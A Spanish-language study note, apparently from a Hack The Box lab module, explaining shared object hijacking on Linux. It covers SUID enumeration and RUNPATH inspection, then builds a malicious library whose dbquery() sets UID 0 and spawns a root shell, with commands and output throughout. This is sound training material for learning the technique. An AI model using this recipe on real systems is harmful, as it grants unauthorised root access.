
El _Shared Object Hijacking_ consiste en aprovechar una configuración incorrecta en la carga de bibliotecas compartidas (`.so`) para conseguir que un programa privilegiado cargue una biblioteca controlada por nosotros.

## 1. Enumeración

### Comprobar binarios SUID

```
find / -type f -perm -4000 2>/dev/null
```

Si encuentras un binario sospechoso, comprueba sus permisos:

```
ls -la payroll
```

Ejemplo:

```
-rwsr-xr-x 1 root root 16728 Sep 1 22:05 payroll
```

La `s` indica que tiene el bit SUID activado.

### Identificar las bibliotecas utilizadas

```
ldd ./payroll
```

Ejemplo:

```
libshared.so => /development/libshared.so
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

En este caso, el binario utiliza una biblioteca personalizada: `libshared.so`.

### Comprobar RUNPATH

```
readelf -d ./payroll | grep PATH
```

Ejemplo:

```
(RUNPATH) Library runpath: [/development]
```

`RUNPATH` indica una ruta de búsqueda de bibliotecas configurada para el ejecutable. Comprueba si puedes escribir en ella:

```
ls -la /development/
```

Si el directorio es modificable por tu usuario y el binario privilegiado carga desde él una biblioteca que puedes controlar, podría existir una vía de escalada.

## 2. Identificar la función que falta

En el ejemplo de HTB, se copia una biblioteca existente para comprobar qué símbolo necesita el programa:

```
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
./payroll
```

El programa devuelve:

```
undefined symbol: dbquery
```

Esto revela que el binario espera encontrar una función llamada `dbquery()` en la biblioteca cargada.

## 3. Crear una biblioteca compartida

Archivo `src.c`:

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

La función `dbquery()` se ejecuta cuando el programa la llama. En el laboratorio, intenta establecer el UID a 0 y abrir una shell que conserve los privilegios.

### Compilar

```
gcc src.c -fPIC -shared -o /development/libshared.so
```

- `-fPIC`: genera código independiente de la posición.
    
- `-shared`: crea una biblioteca compartida.
    
- `-o`: especifica el archivo de salida.
    

## 4. Ejecutar el binario

```
./payroll
```

Si se cumplen las condiciones de explotación, el binario cargará la biblioteca manipulada y llamará a `dbquery()`.

Comprueba los privilegios obtenidos:

```
id
```

En el ejemplo del módulo, el resultado incluye:

```
uid=0(root)
```

## 5. Qué comprobar en un examen

1. Buscar binarios SUID.
    
2. Examinar sus dependencias con `ldd`.
    
3. Inspeccionar `RPATH` y `RUNPATH` con `readelf`.
    
4. Comprobar si puedes escribir en los directorios de búsqueda.
    
5. Identificar las funciones que necesita el binario.
    
6. Verificar si puedes controlar una biblioteca que realmente cargue el programa.
    

**Idea clave:** el problema no es utilizar bibliotecas personalizadas, sino permitir que un usuario sin privilegios controle una biblioteca cargada por un ejecutable privilegiado.
